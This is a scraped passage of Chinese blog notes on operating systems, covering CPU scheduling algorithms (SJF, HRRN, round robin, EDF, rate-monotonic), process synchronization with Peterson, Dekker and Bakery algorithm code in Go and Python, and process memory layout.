8s\r此时平均相应时间为 $(P_{1}+P_2+P_3+P_4)\\div4$ = $(3 + 16 + 9 + 0) \\div 4 = 7$ 。\n此时如果将某一个进程的顺序作为调整，如：P4 调整到 P3之后，会减少对应的平均相应时间吗？对应的gantt如下：\ngantt\rdateFormat YYYY-MM-DD\raxisFormat %S\rtitle SJF scheduling chart\rP1 :p1, 2014-01-01, 6s\rP3 :p2, after p1, 7s\rP4 :p3, after p2, 3s\rP2 :p4, after p3, 8s\r此时平均相应时间为 ：（Pi 为进程的运行时间，Ri 为进程的TT）\n$((P_1-R_4)+(P_3-R_4)+2(P_1+P_3-2\\times P_4)+P_2)\\div4$ $((6-3)+(7-3)+2(6+7 - 2\\times3)+8) \\div 4 = 7.25$ SJF存在的问题：\n饥饿 ；饥饿（starvation）又被称为无限阻塞（indefinite blocking）,\n连续的短任务流会使场任务饥饿 短任务可用时的任何长任务的CPU时间都会增加增加整个队列的平均等待时间 需要预知进程的执行时间\n怎么预估下一个CPU突发的持续时间 简单的解决：询问用户 如果用户欺骗就杀死进程 如果不知道怎么办? 如何确定下一个进程的CPU Brust\n只能通过预估的方式确定进程的执行长度，可以通过使用历史的CPU Brust的长度，使用其平均指数来预估，这里就有几个参数：\n$t_n$：第N点的CPU Brust的实际值 $\\tau_{n}$：第N点的CPU Brust的预估值，。 $\\alpha$：是一个因子，控制整个历史相对的权重，$0 \\leq \\alpha \\leq 1$，通常情况下 $\\alpha$ 设置为 ${1 \\over 2}$ $\\alpha = 0$，则 $\\tau^{n+1} = \\tau^n$，初始预估值永远没有变化 $\\alpha = 1$，则 $\\tau^{n+1} = \\tau^n$，初始预估值始终根据第几个进程的实际值的变化而变化 当$\\alpha = {1 \\over 2}$，则历史和最近的权重相同 Τ0：是一个常数或整个系统的平均值。 得到一个公式：\n$\\tau_{n} = \\alpha t_n+(1-\\alpha)\\tau_{n}$\n$\\tau_{n+1} = \\alpha t_n+(1-\\alpha)\\tau_{n-1} + (1-\\alpha)^2\\tau_{n-2}\u0026hellip;.(1-\\alpha)^j\\tau_{n+1}$\n实例题：$\\tau_1=10$，$\\alpha=5$，之前执行的队列为8,7,4,16，接下来预估值是多少？\nA. 9\tB. 8\tC. 7.5\tD. None\n解析：因为是SJF算法，及历史执行的序列为 [4, 7, 8, 16]，并且已知 $\\tau_1=10$ $t_1=4$ $\\alpha=0.5$\n$\\tau_2 = \\alpha \\times t_{n-1} +(1-\\alpha)\\tau_{n-1}$ = $0.5\\times4+0.5\\times 10=7$ 因为$t_1=4$，$\\tau_1=10$\n$\\tau_3 = \\alpha \\times t_{n-1} +(1-\\alpha)\\tau_{n-1}$ = $0.5\\times7+0.5\\times 7=7$\t因为$t_2=7$，$\\tau_2=7$\n$\\tau_4 = \\alpha \\times t_{n-1} +(1-\\alpha)\\tau_{n-1}$ = $0.5\\times 8+0.5\\times 7=7.5$\t因为$t_3=8$，$\\tau_3=7$\nReference\nhandout scheduling\nSJF Quiz\n最高响应比优先 HRRN（Highest Response Ratio Next）调度算法是操作系统中的一种非抢占式调度算法。HRRN是对SJF的改进版，从而减少饥饿问题。\nHRRN的特点：\n非抢占式 对进程增加了关注点：进程等待了多长时间 防止饥饿问题（无限期延后） $RR = (W+S)\\div S$\nRR：响应比，Response Ratio\nW：表示等待时间。\nS：表示服务的时间，即Burst Time或执行时间。\nHRRN是综合考虑了执行时间和等待时间，如：假设有三个进程按以下顺序到达：P1 , P2, P3，P4；CPU突发时间为 6 8 7 3，将其排好序后如图\nProcess Burst Time Arrival Time P1 3 1 P2 6 3 P3 8 5 P4 4 7 P5 5 8 time=0 时，就绪队列为空，0 到 1 为是 CPU 空闲时间。 在 time=1 时，就绪队列仅有P1。因此，进程 P1 一直执行直到完成。 在进程P1之后，在 time=4 时只有进程 P2 到达，故进程 P2 被执行。 在 time=10 时，进程 P3、P4 和 P5 已全达到就绪队列中。故P2之后，需要计算响应率。 P3 $RR=(10-5+8)/8 = 1.625$ P4 $RR=(10-7+4)/4 = 1.75$ P5 $RR=(10-8+5)/5 = 1.4$ 此时P4响应率最高，故P4先执行，执行后需要计算P3和P5的顺序：\nP3 $RR=(14-5+8)/8 = 2.125$ P5 $RR=(14-8+5)/5 = 2.2$ 此时整个队列中的执行周转时间和等待时间如下表：\n$TT=ET-AT$ $WT=TT-BT$ Process AT BT ET TT WT P1 1 3 4 3 0 P2 3 6 10 7 1 P3 5 8 27 22 14 P4 7 4 14 7 3 P5 8 5 19 11 6 这个队列的执行甘特图就如下：\n平均等待时间：$AWT=(0+1+14+3+6)\\div5 = 24\\div5=4.8$\nHRRN的特点 优点：\nHRRN教SJF有更好的性能。 HRRN可以减少较长进程的等待时间，同时也鼓励较短的作业。 增加了吞吐量，避免了饥饿现象 缺点：\nHRRN处于理想状态，因为无法提前预知每个进程的BT。 HRRN会增加CPU的开销。 轮训 轮训调度算法Round-Robin RR，是最简单的调度算法，即每个进程获得相同的CPU时间量子（quantum）并轮流执行\n如：假设有三个进程按以下顺序到达：P1 , P2, P3，P4；CPU突发时间为 53 8 68 24，时间片为20\nProcess BT P1 53 P2 8 P3 68 P4 24 这四个进程轮流占用CPU，那么执行的甘特图如下：\ngantt\rdateFormat YYYY-MM-DD\raxisFormat %j\rtitle RR Gantt chart\rP1 [0,20] :active,p1, 2020-01-01, 20d\rP2 [20,8] :active,p2, after p1, 8d\rP3 [28,48] :active,p3, after p2, 20d\rP4 [48,68] :active,p4, after p3, 20d\rP1 [68,88]\t:active,p5, after p4, 20d\rP3 [88,108]\t:active,p6, after p5, 20d\rP4 [108,112]\t:active,p7, after p6, 4d\rP1 [112,125]\t:active,p8, after p7, 13d\rP3 [125,145]\t:active,p9, after p8, 20d\rP3 [145,153]\t:active,p10, after p9, 8d\ridel [153,]\t:done, p11, after p10, 10d\r等待时间 WT：\n$P_1 = (68-20)+(112-88)=72$ $P_2=20-0=20$ $P_3=(28-0)+(88-48)+(125-108)=85$ $P_4=(48-0)+(108-68)=88$ 平均等待时间 AWT：\n$AWT=(72+20+85+88)\\div4=66.25$ 性能 q 较大时，类似于FIFO q较小时，上下文切换此时很多，所以q需要设置的较大些 通常情况下，平均周转率要优于SJF，也不会出现饥饿状态 RR的特点 优点：\n避免了饥饿或护航现象 所有进程获得量子都是公平的 没有优先级 不依赖Brust time 缺点：\n花费更多的时间在上下文切换上 性能取决于量子的大小 不能设置优先级 如何设置一个平均大小的量子非常困难 多级反馈队列 多级反馈队列（Multilevel Feedback Queue）是指，当进程进入系统时被永久分配给相应队列。进程不会在队列之间移动。\n就绪队列被划分为不同的队列：\n前台（交互式 interactive）\n后台（批处理 batch）\n每个队列是对应的调度算法：\n前台 – RR 后台 - FCFS 调度必须在队列之间进行：\n固定的调度优先级：如：先前台，再后台 会存在饥饿现象 时间分片：\n每个队列获得一定的时间分片，并在进程间调度 如 RR - 80%前台，FCFS - 20%后台 多级反馈队列通过历史来预测未来，克服了SJF的预测问题；如果进程过去是I/O密集型的，那么未来也可能发生I/O密集型。通过利用这种行为，调度器可以选择使用最少CPU的进程进行调度。\n拥有不同优先级的队列，如RR 一次结束后，将在下一个高优先级的队列进行作业 循环的时间片随着优先级的降低而增长 优先级的调整：\n进程开始在最高优先级队列中执行 当时间片结束，降低优先级 当时间片没结束（发生CPU上下文切换是I/O事件）则提高优先级，直到最高优先级队列 CPU密集型的优先级下降，I/O密集型的优先级上升 公平共享调度 公平共享调度 Fair-share scheduling，是将处理器的时间平均分配给用户，在用户级别公平分享CPU；如有5个用户同时执行一个进程，调度器会将同等份额的 CPU 周期，分配给每个用户，即每个用户20%\n一些用户组比其他用户组更重要 保证不重要的组无法垄断资源 未使用的资源按照每个组所分配的资源的比例来分配 没有达到资源使用率目标的组获得更高的优先级 实时调度 实时操作系统 RTS，正确性依赖于其时间和功能两方面的一个操作系统；RTS调度算法主要目标是关注满足任务期限，而不是对任务吞吐量、延迟和响应时间等指标。\n举个例子：喂养不同种类的动物，如马和奶牛。\n马，每20分钟喂养一次，一次需要10分钟 奶牛，每50分钟喂养一次，每次25分钟 如果使用rr，第一次喂马10分钟，第二次喂牛25分钟，第三次喂马，此时喂养时间不够，马死了 使用固定时间片喂养的话，喂马10分钟，喂牛10分钟，牛喂养时间不足，牛死了 EDF：截止日期最早优先 喂马10分钟 喂牛10分钟 到达第三次，需要又需要喂马，10分钟 第四次，喂牛15分钟，此时时间为45，满足牛和马的喂养时间，使用EDF，可以保障到牛和马都不会死 性能指标： 时间约束的及时性 deadline 速度和平均性能相对不重要 主要特征：时间约束的可预测性 RTS分类: 硬实时系统 Hard RTS：需要在保证时间内完成重要的任务；必须完成，错过最后期限deadline，将对整个系统产生灾难性的故障。 软实时系统 Soft RTS: 要求重要的进程的优先级更高，尽量完成，并非必须 RTS相关时间参数 $a_j$ ：Arrival Time，工作准备好执行的时间。 $C_j$：Computation (execution) time，任务在处理器不中断的情况下执行所需要的时间 $d_j$：Absolute deadline，绝对截止时间，工作应该完成的时间 $D_j$：Relative deadline，到达时间和绝对截止时间之间的长度 $S_j$：Start Time，进程开始执行的时间 $f_j$：Finishing Time，进程完成执行的时间 $R_j$：Response time，作业到达后执行时间的长度，$R_j=f_j-a_j$ 实时系统要求 决定任务执行的顺序 静态优先级调度 动态优先级调度 EDF Earliest Deadline First (EDF)，截止日期最早优先，EDF使用进程的优先级进行调度。它根据绝对终止期限为进程分配优先级。截止日期最近的任务获得最高优先级。\n有五个进程，如表：\nProcess $a_j$ $C_j$ $d_j$ J1 0 5 6 J2 2 2 8 J3 8 6 20 J4 10 3 14 J5 15 4 22 那么其执行甘特图如下\nEDF特点：\n最佳的动态优先级调度算法 deadline越早优先级越高 先执行deadline最早的任务 RM 速率单调 Rate-Monotonic 算法是指，周期较小的任务具有较高的优先级。（$C_i, T_i, D_i$）\n$T_i$ ：周期任务\nt1 = (1, 6, 6), t2 = (2, 8, 8), t3 = (4, 12, 12) RM特点：\n提前进行优先级排序 适合静态优先调度 周期越短，优先级越高 先执行周期最短的任务 Reference\nReal-Time Scheduling\n多处理器调度 多处理器调度，即存在多个 CPU可用，然而，与单处理器调度相比，多处理器调度更复杂。\n多处理器调度方法 非对称多处理，Asymmetric multiprocessing AMP 一个系统只允许一个CPU执行代码，如一个处理器处理用户代码，其他处理器处理I/O 对称多处理，Symmetrical Multi-Processing SMP， 每个处理器是自调度的，即单独的就绪队列或者公共就绪队列，通过调度器分配要执行的程序 亲和度 亲和度 Affinity 是指，进程在一个处理器上运行时，当发生转移时，需要释放对应的缓存，在新处理器上在加载，此时增加了系统的相应速度，通常情况下，SMP会视图避免进程从一个处理器迁移至另一个处理器上。\n软亲和度，Soft Affinity，是调度器尽可能长时间地将进程保持在同一个 CPU 上。这只是一种尝试；如果不可行，则将进程迁移到另一个处理器 硬亲和度，hard affinity，硬亲和度是利用系统调用 (system call)，强行将进程绑定到指定的CPU上 负载均衡 负载均衡是为了使多个CPU尽可能均衡的处理任务，即出现在SMP的现象，负载均衡可以保持所有处理器之间的工作负载平衡，以充分利用多个处理器的；否则就出现一个或多个处理器将处于空闲状态，而其他处理器具有高工作负载状态。\n负载均衡的通用方法：\n推送迁移：是指操作系统定期检查每个处理器上的负载。如果存在不平衡，一些进程将从一个处理器移动到另一个处理器。 拉取迁移：调度器发现一个处理器的运行队列中没有更多进程时。会从繁忙的处理器中拉出等待的任务 Reference\nLoad Balancing\ncpu affinity\nmultiple-processor-scheduling\nwhat are the types of process affinity\n优先级反转 由于低优先级任务的干扰而导致的任务执行延迟称为优先级反转 priority inversion，优先级反转是1997年火星拓荒者着陆的一个问题。\n如图所示：高优先级任务与低优先级任务共享资源时。当低优先级任务锁定资源时，高优先级任务必须等待，即使高优先级任务有资格运行。\n如图所示，LP任务使用对共享资源加锁，t2时间HP发生抢占，此时因为LP没有对锁释放，HP处于阻塞状态，而MP发生抢占直到t5结束，此时CPU回到LP任务，直到t6结束，释放锁，此时HP才开始执行，即使HP处于高优先级也不会被执行。\n解决的方法：\n优先级继承 Priority Inheritance 低优先级任务持有高优先级请求的资源，则低优先级任务将提高到与高优先级任务相同的优先级 如图所示：具有不同优先级的三个任务共享一个资源。LP首先在时间 t1 获取资源。在t2，MP抢占 LP到 t3，当MP它需要资源时。MP被阻止。此时，LP 提升优先级同MP并恢复执行。HP在 t4抢占 LP 任务。当 HP 访问共享资源时，在 t5 被阻止。此时LP 从 HP 继承其优先级并恢复执行。一旦 LP 完成，它的优先级立即降低到最初分配的级别。 优先级天花板 Priority ceiling 优先级天花板中，每个任务的优先级都是已知的。每个任务所需的资源在执行之前也是已知的。任何时候正在运行的任务的当前优先级上限是当时正在使用的所有资源的最高优先级上限。 Reference\nPriority Inversion\n","permalink":"https://www.oomkill.com/2022/04/ch8-cpu-scheduling-algorithms/","summary":"","title":"ch8 CPU调度算法"},{"content":"Background 多进程作为现代操作系统的重要特性，交互则会引起同时对共享资源的访问，当这些资源访问不正确会出现冲突或产生不适当的输出（冲突、死锁、饥饿）；而在同步的基础上，进程被分为以下两种类型：\n独立进程 Independent Process 不和其他进程共享资源或状态 确定性，输入状态确定结果 可重现，能够重现起始条件，I/O 调度的顺序不重要 协作进程 Cooperative Process； 多进程共享资源或状态 不确定性 probabilistic 不可重现 不确定性和不可重现意味着bug可能是间歇性发生的\nCooperation 进程的互相影响，即进程间的合作（相互或破坏）；最简单的例子就是两个进程使用同一个文件，一个进程读，一个进程写。读进程的结果会被写进程所影响。\n进程需要合作的原因：\n资源共享：多个进程访问相同的数据 一台电脑，多个用户 一个银行存款余额,多台ATM机 嵌入式系统（机器人手臂和收的协调） 计算加速： I/O 和 CPU计算可重叠 多处理器 - 将任务分解为子任务并分布在不同的进程中，它通常可以更快地运行（也需要多个可共享的 CPU） 模块化：复杂的任务组织成单独的子任务，让不同的进程运行 大程序分成小程序 是系统易于扩展 程序可以调用函数fork()来创建一个新的进程\n操作系统需要分配一个新的并且唯一的进程ID 因此在内核中,这个系统调用会运行 new_pid = next_pid++; 翻译成机器指令: Load next_pid Reg1 STORE Reg1 new_pid INC Reg1 STORE Reg1 next_pid 假设两个进程并发执行\n如果next_pid等于100, 那么其中一个进程得到的ID应该是100, 另一个进程的ID应该是101, next_pid应该增加到102 可能在INC前进行了上下文切换, 最终导致两个进程的pid都是100,而next_pid也是101 无论多个线程的指令序列怎样交替执行,程序都必须正常工作\n多线程程序具有不确定性和不可重现的特点 不经过专门设计,调试难度很高 不确定性要求并行程序的正确性\n先思考清楚问题，把程序的行为设计清楚 切忌给予着手编写代码，碰到问题再调试 Race Condition 竞态条件是由操作系统软件中的同步错误。出现在进程试图同时执行两个或多个操作时，这是一种不希望出现的情况。\n怎么样避免竞态?\nAtomic Operator(原子操作)\n原子操作是指一次不存在任何终端或者失败的执行\n该执行成功结束 或者根本没有执行 并且不应发生任何部分执行的状态 假设设计一个程序，A和B两个进程互相竞争，一个进程使counter+1，另外一个进程使counter-1\nwhile (true) { /* produce an item in next produced */ while (counter == BUFFER_SIZE) ; /* do nothing */ buffer[in] = next_produced; in = (in + 1) % BUFFER_SIZE; counter++; } while (true) { while (counter == 0) ; /* do nothing */ next_consumed = buffer[out]; out = (out + 1) % BUFFER_SIZE; counter--; /* consume the item in next consumed */ } P1和P2指令的执行顺序不同，产生的结果也不同。可能存在P1执行完或P2先执行完，也可能永远执行不完\n临界区：程序中试图访问共享资源并可能导致竞态条件的区域称为临界区 Critical Section 互斥 Mutual Exclusion：如果一个进程在临界区并访问共享资源，则不允许临界区有其他进程处于临界区并访问共享资源。 死锁 Deadlock：两个或两个以上进程，互相等待完成特定任务，而最终没法将自身任务进行下去 有界等待 Bounded Waiting：在一个进程发出进入其临界区的请求后，在该进程的请求被批准之前，有多少个进程可以进入临界区是有限制的。因此，达到限制后，必须有授予权限的进程才能进入其临界区。此条件的目的是确保每个进程都有机会进入其临界区，从而没有进程永远饥饿。 饥饿 Starvation：一个可执行的进程，长期被调度器忽略，以至于虽然处于可执行状态却不被执行。 无忙等待 忙等待 busy-waiting：忙等待是指，进程在继续执行之前等待并不断的检查要满足的条件，例如说循环、锁；一般情况下忙等待分为两种\n消耗处理器的同时不断检查要满足的条件 不消耗处理器，当满足条件时，会被唤醒 在一些操作系统中，忙等待很低效，循环会浪费CPU资源。但通常情况下，解决忙等待的方法就是延迟；例如\nwhile z is still in use do sleep(900) end 另外一种方式就是信号量的阻塞进程，即处于忙碌等待状态的进程被阻塞并放置在不消耗资源的等待队列中。一旦满足条件，该过程将重新启动并放置在就绪队列中。\nReference synchronization\nrace condition\nbusy waiting\n禁用硬件中断 如何保障临界区操作是原子的，只要不发生上下文切换，那么操作就是原子的，即禁用硬件中断 disable interupt instruction DI instruction\n进入临界区禁用中断 操作临界区代码 离开临界区启用中断 class Lock { int value = FREE; } Lock::Acquire() { Disable interrupts; # 禁用中断 while (value != FREE) { # 等待锁 Enable interrupts; Disable interrupts; } value = BUSY; Enable interrupts; } Lock::Release() { Disable interrupts; value = FREE; # 解锁 Enable interrupts; # 启用中断 } 缺点：\n一旦中断被禁用，线程就无法被停止\n整个系统都会为你停下来 可能导致其他线程处于饥饿状态 要是临界区可以任意长怎么办？\n无法限制响应中断所需的时间(可能存在硬件影响) 要小心使用，适合于较小的操作\n软件解决方案 屏蔽硬件中断简单有效，但受制于临界区执行时间，影响整个系统的效率。\nPeterson 一个满足两个进程进程Pi 和 Pj 之间互斥的经典的基于软件的解决方法(1981年)，Peterson算法；Peterson 算法是基于双进程的互斥访问，需要两个锁：\n一个使用 flag，是一个布尔数组 另外一个使用 turn 的int锁 而这两个锁都有可能出现死锁的情况：如\nint turn = 0 turn = j do { while( turn != i); Critical Section turn = j; remainder section\t} while(1) 另外一个进程\nint turn = 0 turn = i do { while( turn != j); Critical Section turn = i; remainder section\t} while(1) 满足了互斥，没满足progress（想进入临界区的进程），最终只有一个进程可以进入，无法进行流转。\nPeterson 算法基于两个锁的临界区问题的解决方案：\n一个使用 flag，是一个布尔数组；boolean flag[i] 初始化为false，即没有进程有兴趣进入临界区 另外一个使用 turn 的int锁；进入临界区的进程 int trun; boolean flag[]; do{ flag[i] = true; // 此时i想进入临界区 turn = j // 但是当前是i while(flag[j] \u0026amp;\u0026amp; turn ==j); critical section flag[i] = false; remander section } while(true); Peterson 算法可以解决上述单锁的问题：\n互斥是有保证：任何时候仅有一个进程可以访问临界区 进程有保证：不会阻止临界区外其他进程进入临界区 Peterson 算法的缺点：\n忙等待 仅限于两个进程 Dekker Dekker是另外一种临界区解决方法，Dekker从第五版才完整满足了所有的条件；dekker算法类似于Peterson 算法；下面是算法的实现：\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;math/rand\u0026quot; \u0026quot;time\u0026quot; ) var thread1wantstoenter = false // 进程是否在执行 var thread2wantstoenter = false // 进程是否在执行 var favouredthread int // 进入临界区的进程 var cs = 0 func main() { go thread1() go thread2() time.Sleep(time.Second * 20) } func thread1() { fmt.Printf(\u0026quot;thread %d Start execute\\n\u0026quot;, 1) for { fmt.Printf(\u0026quot;get a lock, %d \\n\u0026quot;, cs) thread1wantstoenter = true for thread2wantstoenter == true { fmt.Printf(\u0026quot;1 get a lock, thread %d also executing.\\n\u0026quot;, 2) if favouredthread == 2 { fmt.Printf(\u0026quot;current cs thread is %d also executing.\\n\u0026quot;, favouredthread) thread1wantstoenter = false for favouredthread == 2 { // 忙等待，一直等到当前临界区进程不为对方 } thread1wantstoenter = true } } fmt.Printf(\u0026quot;not get lock, begin update cs1.\\n\u0026quot;) cs = 1 time.Sleep(time.Millisecond * time.Duration(rand.Intn(1000))) favouredthread = 2 thread1wantstoenter = false fmt.Printf(\u0026quot;thread %d has completed\\n\u0026quot;, favouredthread) fmt.Printf(\u0026quot;cs value with update %d \\n\u0026quot;, cs) } } func thread2() { fmt.Printf(\u0026quot;thread %d Start execute\\n\u0026quot;, 2) for { fmt.Printf(\u0026quot;get a lock, %d \\n\u0026quot;, cs) thread2wantstoenter = true for thread1wantstoenter == true { fmt.Printf(\u0026quot;2 get a lock, thread %d also executing.\\n\u0026quot;, 1) if favouredthread == 1 { fmt.Printf(\u0026quot;current cs thread is %d also executing.\\n\u0026quot;, favouredthread) thread2wantstoenter = false for favouredthread == 1 { // 忙等待，一直等到当前临界区进程不为对方 } thread2wantstoenter = true } } fmt.Printf(\u0026quot;not get lock, begin update cs2.\\n\u0026quot;) cs = 2 favouredthread = 1 time.Sleep(time.Millisecond * time.Duration(rand.Intn(1000))) // 退出，标记着线程2已完成， thread2wantstoenter = false fmt.Printf(\u0026quot;thread %d has completed\\n\u0026quot;, favouredthread) fmt.Printf(\u0026quot;cs value with update %d \\n\u0026quot;, cs) } } 整个for部分是一个锁，如果其他进程没有占用临界区，则可以进入临界区；这样第一个 for保证了互斥，在两个进程都没有被标记时，至少有一个进程可以进入，这样保证了progess。\n再假设，thread1永远卡在thread2wantstoenter == true；最终thread2会退出favouredthread = 1；这样的话不存在死锁，最终会脱离循环，脱离后会将自己设置为true thread1wantstoenter = true；这样的话，只要对方（thread2）为false了，即结束临界区访问；那么下一次循环将退出锁部分，并且可已访问临界区\n如果不对 favouredthread == counterpart 进行判断，那么就会出现饥饿现象。\nReference\ndekker algorithm\nwikipedia\nbakery bakery算法是针对N个进程互斥提出的解决方法之一；\n每当有进程进入临界区时，会被分配一个数 拥有最小数的进程会被选入临界区； 如果进程Pi 和 Pj 被分配相同的数，并且 $i\u0026lt;j$，那么进程Pi 首先进入临界区，进程编号 i j不会重复 定义操作符号 \u0026lt; 判断 $(a,b) \u0026lt; (c,d)$；当 $a\u0026lt;c$即 $(a,b)\u0026lt;(c,d)$; 如果 $a=c$，那么则判断b和d 定义操作函数 max() $max(a_0,\\ \u0026hellip;,\\ a_{n-1})$，是整个序列 $(a_0,\\ \u0026hellip;,\\ a_{n-1})$ 中的一个数 k，使 $k \u0026gt; a_i$； for i=0,... n-1 定义共享数据 boolean choosing[n] int number[n] 初始值分别为false和0 数的分配以递增顺序产生 1 2 3 4 5\u0026hellip;. 需要满足的条件，当一个线程想要进入临界区时，它必须确保它具有最小的数字，但是还需：\n线程状态不为真，即已经完成选号，在进程数组中，并且状态为false 如果线程编号相同，那么最小id的可以进入，即 id和index比谁小 id是当前的id，index是列表中其他的线程 package main import ( \u0026quot;fmt\u0026quot; \u0026quot;math\u0026quot; \u0026quot;math/rand\u0026quot; \u0026quot;time\u0026quot; ) var choosing []bool var number []int var cs int func thread(id int) { var maximum int time.Sleep(time.Millisecond * time.Duration(rand.Intn(500))) // 19-25 线程i开始选择号码，为maximum+1 choosing[id] = true maximum = 0 for i := range number { maximum = int(math.Max(float64(maximum), float64(i))) } number[id] = maximum + 1 choosing[id] = false for i := range number { if i != id { // 此时进程j进入临界区但没有选号完成则i进行忙等待等待选号完成 for choosing[id] { // 忙等待 fmt.Printf(\u0026quot;thread %d busy-waiting 1. \\n\u0026quot;, id) } // 当一个线程想要进入临界区时，必须确保它具有最小的数字（优先级最高） // 当前线程 必须为最小，即number[id] \u0026gt; number[i]需要忙等待 // 如果线程获得相同编号 ，id低的可以抢先 即 (number[id] == number[i] \u0026amp;\u0026amp; id \u0026gt; i) 需要阻塞 for number[i] != 0 \u0026amp;\u0026amp; (number[id] \u0026gt; number[i] || (number[id] == number[i] \u0026amp;\u0026amp; id \u0026gt; i)) { // 忙等待 fmt.Printf(\u0026quot;thread %d busy-waiting 2.\\n\u0026quot;, id) } } } // 即所有的id全部等于0就是没有其他进程抢占。就可以进入临界区 // 临界区 fmt.Printf(\u0026quot;critical section used by thread %d \\n\u0026quot;, id) cs = id fmt.Printf(\u0026quot;critical section has been modified to %d \\n\u0026quot;, cs) // 退出临界区 time.Sleep(time.Millisecond * time.Duration(rand.Intn(100))) number[id] = 0 } func main() { number = make([]int, 6) choosing = make([]bool, 6) for n := 1; n \u0026lt;= 5; n++ { number[n] = n choosing[n] = false go thread(n) } time.Sleep(time.Second * 5) } python的实现\nimport threading import random import time class BakeryAlgorithm(): # declaration and initial values of global variables # ticket for threads in line, n - number of threads tickets = [0,1,2,3,4] # True when thread entering in line entering = [False]*5 def lock(self,*args): self.entering[args[0]] = True maximum = 0 for ticket in self.tickets: maximum = max(maximum, ticket) self.tickets[args[0]] = maximum+1 self.entering[args[0]] = False for i in range(len(self.tickets)): if i != args[0]: # Wait until thread j receives its number: while self.entering[i]: print(\u0026quot;waiting %d\u0026quot; % (args[0])) # Wait until all threads with smaller numbers or with the samenumber, but with higher priority, finish their work: while self.tickets[i] != 0 and (self.tickets[args[0]] \u0026gt; self.tickets[i] or (self.tickets[args[0]]==self.tickets[i] and args[0])\u0026gt;i): print(\u0026quot;waiting %d 2\u0026quot; % (args[0])) # The critical section goes here... print(f\u0026quot;critical section used by process{args[0]}\u0026quot;) #exit section self.tickets[args[0]] = 0 def main(self): # Running all the 5 processes using thread module and passing process index as args since Thread supports args and kwargs argument only t1 = threading.Thread(target = self.lock, args = (0,)) t2 = threading.Thread(target = self.lock, args = (1,)) t3 = threading.Thread(target = self.lock, args = (2,)) t4 = threading.Thread(target = self.lock, args = (3,)) t5 = threading.Thread(target = self.lock, args = (4,)) t1.start() t2.start() t3.start() t4.start() t5.start() if __name__ == \u0026quot;__main__\u0026quot;: b = BakeryAlgorithm() b.main() 互斥：有没有可能2个以上进程同时进临界区 最小的id才可进入临界区 如果多个id拿到同样最小号，那么他们的进程id也不一样，进程id最小的可以进入临界区 上述保证了互斥 有界等待：等待的进程不超过$n-1$；可以保证每个进程都能进入临界区 progress：想进入临界区的进程，不想进入的number=0也会被驱逐 Reference\nPython Implementation of Bakery Algorithm\nbakery algorithm\n更高级抽象 硬件提供了一些原语\n像中断禁用, 原子操作指令等 大多数现代体系结构都这样 操作系统提供更高级的编程抽象来简化并行编程\n例如，锁，信号量 从硬件原语中构建 锁是一个抽象的数据结构\n一个二进制状态(锁定,解锁),两种方法 Lock::Acquire() 锁被释放前一直等待,然后得到锁 Lock::Release() 锁释放,唤醒任何等待的进程 使用锁来编写临界区\n前面的例子变得简单起来:\nlock_next_pid-\u0026gt;Acquire(); new_pid = next_pid++; lock_next_pid-\u0026gt;Release(); 大多数现代体系结构都提供特殊的原子操作指令\n通过特殊的内存访问电路 针对单处理器和多处理器 Test-and-Set 测试和置位\n从内存中读取值 测试该值是否为1(然后返回真或假) 内存值设置为1 交换\n交换内存中的两个值 bool TestandSet(bool *target){ bool rv = *target; *target = true; return rv; } void Exchange(bool *a, bool *b){ bool tmp = *a; *a = *b; *b = tmp; } 总结\n锁是更高等级的编程抽象\n互斥可以使用锁来实现 通常需要一定等级的硬件支持 常用的三种实现方法\n禁用中断(仅限于单处理器) 软件方法(复杂) 原子操作指令(单处理器或多处理器均可) 可选的实现内容:\n有忙等待 无忙等待 ","permalink":"https://www.oomkill.com/2022/04/ch9-synchronization/","summary":"","title":"ch9 同步"},{"content":"Overview 进程的描述 进程的状态 State 线程 Thread 进程间通信 Inter-Process Communication 进程互斥与同步 死锁 DeadLock 进程的描述 在操作系统中，通常来说进程 Process 是当前正在执行的东西。因此，一个具有一定独立功能的程序在一个数据集合上的一次动态执行过程，可以称之为进程。\n程序是静态的文件\n进程是程序动态执行的过程\n进程的组成 进程包括 :\n程序的代码 程序处理的数据 程序计数器 (PC) 中的值, 指示下一条将运行的指令 一组通用的寄存器的当前值, 堆 Heap , 栈 Stack 一组系统资源(如打开的文件、内存、网络) 而进程的主要构成如下，\nStack Section Heap Section Data Section Text Section Stack Stack部分包含：\n局部变量 函数和返回地址 main函数 如上图所示，Stack和 heap 以相反的方向增长，如果两者都以相同的方向增长，那么其两者可能会重叠，因此如果它们以相反的方向增长则很好。\n示例：如，调用下列函数时，将存储在Stack部分，一旦函数返回，该函数堆栈部分的值将被删除。\nStack上有一个堆栈帧，其中包含main函数以及局部变量a, b sum 。使用 printf()，创建的帧以及局部变量只能在内存中访问，帧的持续时间在从函数 return 0 后释放。\nint main(void) {\rint a, b, sum;\ra = 2;\rb = 3;\rsum = a + b;\rprintf(\u0026quot;%d\\n\u0026quot;, sum);\rreturn 0\r}\rStack是一种后进先出 (LIFO) 数据结构，最后一个被推到Stack上的内容就是从顶部弹出的第一个内容。不允许从Stack的中间插入或移除。因此Stack必须至少支持两种操作：push 和 pop ；其他操作也是可以，但不是必需的。\n在Linux中，ulimit -a 是可以获取和设置用户限制的函数\nHeap 当程序在运行时需要内存时，此部分用于提供动态内存。它是从Heap提供的。\n如在C语言中，malloc()和calloc()用于此目的，例如：\nmalloc(4) 将返回Heap区域中 4 BYTE 块的起始地址。 alloca()：从Stack申请内存，因此无需释放. 需要注意的是，在 C 语言中，动态内存需要处理，即在不需要时释放，否则一段时间后堆会变满。\n因此，在 C 程序中使用了free()函数来执行此操作。\n相比于Stack，Heap更为灵活，在Heap中，程序可以在的任何位置分配或释放内存。这种情况下就意味着Heap中间可能有一个“hole”，即未分配的内存被分配的内存包围着\n由图可以看出 ，当程序释放或释放两个相邻的内存块时，Heap区域会将其合并成一个大块。这样做可以让heap更好地满足未来对大块内存的需求。交叉阴影（彩色块大小的两倍）块说明了对大块内存的请求。\ndata data部分包含全局变量和静态局部变量。例如：\n#include\u0026lt;stdio.h\u0026gt;\rint glbal _var ; // 全局变量将存储到data区\rint main()\r{\rstatic int var ; // 静态变量存储到data区\r// code statement\rreturn 0;\r}\r在保存全局变量和静态变量的内存通常在程序启动时分配。\ntext text部分包含可执行指令、常量和宏，它是只读位置并且是可共享的，因此也可以被其他进程使用。\n通常情况下，Text区域是可共享的，因此对于频繁执行的程序，只需要在内存中保存一个副本。此外，文本段通常是只读的，以防止程序意外修改其指令。\nReference\nlayout of a process\nmemory\nstack vs heap\n程序和进程的关系 进程和程序之间的联系\n程序是产生进程的基础 程序的每次运行构成不同的进程 